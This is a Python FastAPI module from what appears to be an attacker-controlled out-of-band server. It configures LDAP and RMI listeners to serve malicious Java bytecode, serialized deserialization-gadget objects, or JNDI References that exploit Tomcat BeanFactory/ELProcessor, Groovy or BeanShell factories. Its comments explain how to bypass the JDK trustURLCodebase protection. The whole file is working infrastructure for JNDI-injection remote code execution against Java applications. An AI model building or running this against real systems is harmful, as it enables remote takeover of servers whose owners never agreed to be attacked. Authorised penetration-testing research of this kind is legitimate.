"""Rebind management API — view / override what bytecode a token's LDAP/RMI serves."""
from __future__ import annotations

import logging
from typing import Any

import httpx
from fastapi import APIRouter, Depends, HTTPException, status
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from ..auth.deps import current_user
from ..config import get_settings
from ..db import get_session
from ..models import OobToken, Project, User

log = logging.getLogger(__name__)
router = APIRouter(prefix="/api/rebind", tags=["rebind"])


@router.post("/{token}/set")
async def set_rebind_payload(
    token: str,
    body: dict[str, Any],
    user: User = Depends(current_user),
    session: AsyncSession = Depends(get_session),
) -> dict[str, str]:
    """Override what bytecode/serialized-data the LDAP/RMI listener returns for a token.

    body keys:
      class_name   – Java class name (required)
      bytecode_b64 – Base64 class file (.class bytecode) — LDAP returns javaCodeBase
      serialized_b64 – Base64 Java serialized object — LDAP returns javaSerializedData
                       (bypasses trustURLCodebase on JDK >= 8u191)
      chain        – optional: wrap in deserialize chain before serving
    """
    s = get_settings()
    res = await session.execute(
        select(OobToken).join(Project).where(OobToken.token == token, Project.owner_id == user.id)
    )
    tok = res.scalar_one_or_none()
    if not tok:
        raise HTTPException(status.HTTP_404_NOT_FOUND, "token not found")
    class_name = body.get("class_name")
    bytecode_b64 = body.get("bytecode_b64")
    serialized_b64 = body.get("serialized_b64")  # Java serialized object (AC ED 00 05 ...)
    if not class_name or (not bytecode_b64 and not serialized_b64):
        raise HTTPException(status.HTTP_422_UNPROCESSABLE_ENTITY,
                            "class_name and bytecode_b64 (or serialized_b64) required")

    spec = dict(tok.payload_spec or {})
    spec["class_name"] = class_name

    if serialized_b64:
        # javaSerializedData mode: embed serialized object directly in LDAP response
        # Bypasses trustURLCodebase because no remote class loading occurs
        spec["serialized_b64"] = serialized_b64
        spec.pop("bytecode_b64", None)
        tok.intent = "jndi_serialize"
    else:
        # Classic javaCodeBase mode: LDAP returns URL to download class
        spec["bytecode_b64"] = bytecode_b64
        spec.pop("serialized_b64", None)
        tok.intent = "jndi"
        # Tell sidecar to cache this bytecode under the token
        try:
            async with httpx.AsyncClient(timeout=s.sidecar_timeout) as cli:
                r = await cli.post(
                    f"{s.sidecar_url}/rebind/register",
                    json={"token": token, "class_name": class_name, "bytecode_b64": bytecode_b64},
                )
            if r.status_code != 200:
                raise HTTPException(status.HTTP_502_BAD_GATEWAY, f"sidecar: {r.text[:200]}")
        except httpx.ConnectError:
            raise HTTPException(status.HTTP_503_SERVICE_UNAVAILABLE, "bytecode-service is not running")

    tok.payload_spec = spec
    await session.commit()

    ldap_url = f"ldap://{s.public_address}:{s.ldap_port}/{token}/{class_name}"
    rmi_url = f"rmi://{s.public_address}:{s.rmi_port}/{token}/{class_name}"
    mode = "javaSerializedData" if serialized_b64 else "javaCodeBase"
    return {"ldap_url": ldap_url, "rmi_url": rmi_url, "class_name": class_name, "mode": mode}


@router.post("/{token}/set-reference")
async def set_reference_payload(
    token: str,
    body: dict[str, Any],
    user: User = Depends(current_user),
    session: AsyncSession = Depends(get_session),
) -> dict[str, str]:
    """Configure LDAP to serve a JNDI Reference for local-factory RCE (TomcatEL, Groovy, BeanShell).

    body keys:
      ref_class_name  – Java class name to instantiate (e.g. javax.el.ELProcessor)
      ref_factory     – JNDI ObjectFactory class (e.g. org.apache.naming.factory.BeanFactory)
      ref_addr_list   – list of RefAddr strings in "#pos#type#content" format
    """
    s = get_settings()
    res = await session.execute(
        select(OobToken).join(Project).where(OobToken.token == token, Project.owner_id == user.id)
    )
    tok = res.scalar_one_or_none()
    if not tok:
        raise HTTPException(status.HTTP_404_NOT_FOUND, "token not found")

    ref_class_name = body.get("ref_class_name", "javax.el.ELProcessor")
    ref_factory = body.get("ref_factory", "org.apache.naming.factory.BeanFactory")
    ref_addr_list = body.get("ref_addr_list", [])

    spec = dict(tok.payload_spec or {})
    spec["ref_class_name"] = ref_class_name
    spec["ref_factory"] = ref_factory
    spec["ref_addr_list"] = ref_addr_list
    tok.intent = "jndi_reference"
    tok.payload_spec = spec
    await session.commit()

    ldap_url = f"ldap://{s.public_address}:{s.ldap_port}/{token}/Ref"
    return {"ldap_url": ldap_url, "mode": "jndi_reference",
            "ref_class_name": ref_class_name, "ref_factory": ref_factory}


@router.delete("/{token}/clear")
async def clear_rebind(
    token: str,
    user: User = Depends(current_user),
    session: AsyncSession = Depends(get_session),
) -> dict[str, str]:
    s = get_settings()
    res = await session.execute(
        select(OobToken).join(Project).where(OobToken.token == token, Project.owner_id == user.id)
    )
    tok = res.scalar_one_or_none()
    if not tok:
        raise HTTPException(status.HTTP_404_NOT_FOUND, "token not found")
    tok.intent = "record"
    await session.commit()
    try:
        async with httpx.AsyncClient(timeout=s.sidecar_timeout) as cli:
            await cli.delete(f"{s.sidecar_url}/rebind/{token}")
    except Exception:
        pass
    return {"status": "cleared"}
